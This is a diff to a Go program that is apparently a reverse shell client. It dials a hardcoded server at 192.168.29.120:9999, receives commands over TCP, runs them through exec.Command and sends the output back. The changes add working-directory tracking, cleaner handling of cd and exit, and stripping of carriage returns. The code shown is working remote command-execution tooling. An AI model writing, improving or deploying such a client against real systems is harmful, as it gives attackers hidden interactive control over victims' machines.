@@ -9,8 +9,10 @@ import (
 	"strings"
 )
 
-const ipAddr = "192.168.29.120" // IP address of the socket server
-const port = "9999"             // Port address of the socket server
+const ipAddr = "192.168.29.120" // IP address of the server.
+const socketPort = "9999"       // Port address of the socket server.
+
+var path string = ""
 
 // Function to execute a shell command.
 // Returns the outpput of the command that is run.
@@ -33,6 +35,7 @@ func Execute(value string) string {
 
 	// The ellipsis (...) indicates that a slice or array should be "expanded" into individual arguments for the function.
 	cmd := exec.Command(name, tmp...)
+	cmd.Dir = path
 	output, err := cmd.Output()
 
 	// Return Error message if err != nil
@@ -48,7 +51,7 @@ func main() {
 
 	// Tries to establish a TCP connection with the service hosted on {ipAddr}:{port}
 	// Exits (panic) the program if it fails to establish a connection
-	conn, err := net.Dial("tcp", ipAddr+":"+port)
+	conn, err := net.Dial("tcp", ipAddr+":"+socketPort)
 	if err != nil {
 		panic(err)
 	}
@@ -57,7 +60,7 @@ func main() {
 	defer conn.Close()
 
 	// Changes the directory of the program to root ("/") directory
-	os.Chdir("/")
+	path, _ = os.Getwd()
 
 	for {
 
@@ -73,20 +76,25 @@ func main() {
 
 		// Trim the leading and trailing null(\x00) values
 		// as string length can be less than the buffer size of 2048 bytes.
-		command := strings.Trim(string(buffer), "\x00")
+		command := strings.Trim(string(buffer), "\x00")[1:]
+
+		// Exit the infinite loop if command is "exit".
+		if strings.HasPrefix(command, "exit") {
+			break
+		}
 
 		// Check for a change in directory.
 		if strings.HasPrefix(command, "cd") {
+			val := ""
 			tmp := strings.Split(command, " ")
-			os.Chdir(tmp[1])
-			dir, _ := os.Getwd()
-			conn.Write([]byte(dir))
+			val = strings.Trim(tmp[1], "\r")
+			err := os.Chdir(val)
+			if err != nil {
+				fmt.Println(err.Error())
+			}
+			path, _ = os.Getwd()
+			conn.Write([]byte(path))
 			continue
-		}
-
-		// Exit the infinite loop if command is "exit".
-		if command == "exit" {
-			break
 		}
 
 		// Execute command
